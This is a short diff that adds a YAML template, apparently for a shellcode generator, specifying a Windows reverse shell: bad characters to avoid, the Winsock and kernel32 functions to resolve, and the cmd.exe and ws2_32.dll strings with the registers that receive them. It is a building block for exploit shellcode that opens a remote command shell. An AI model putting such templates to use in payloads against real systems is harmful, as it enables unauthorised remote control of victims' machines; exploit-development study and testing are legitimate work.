@@ -1,0 +1,22 @@
+# Reverse shell — kernel32 + ws2_32
+template: reverse_shell
+badchars: ["00", "0A", "0D"]
+
+functions:
+  - CreateProcessA
+  - LoadLibraryA
+  - WSAStartup
+  - WSASocketA
+  - connect
+
+variables:
+  - socket_handle
+
+strings:
+  - label: cmd
+    value: cmd.exe
+    method: mov
+    dest: edi
+  - label: ws2_dll
+    value: ws2_32.dll
+    method: push
